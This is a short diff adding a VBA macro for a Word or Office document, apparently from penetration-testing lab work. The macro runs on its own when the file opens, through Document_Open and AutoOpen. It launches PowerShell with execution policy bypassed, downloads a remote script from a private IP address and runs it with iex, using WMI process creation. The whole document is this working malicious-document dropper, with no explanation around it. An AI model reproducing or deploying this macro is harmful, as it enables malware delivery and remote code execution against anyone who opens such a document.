@@ -1,0 +1,12 @@
+Sub MyMacro
+    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.58/run.ps1'))"
+    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
